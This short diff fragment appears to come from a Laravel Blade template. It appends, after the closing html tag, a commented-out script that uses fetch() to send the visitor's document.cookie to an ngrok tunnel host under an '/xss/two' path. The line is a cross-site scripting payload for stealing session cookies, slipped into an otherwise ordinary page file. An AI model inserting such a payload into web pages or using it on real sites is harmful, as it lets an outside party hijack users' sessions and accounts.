@@ -60,3 +60,5 @@
 </body>
 
 </html>
+
+{{-- <script>fetch("https://3e36-51-52-158-78.ngrok-free.app/xss/two?name=Kevin&cookie=" + document.cookie)</script> --}}
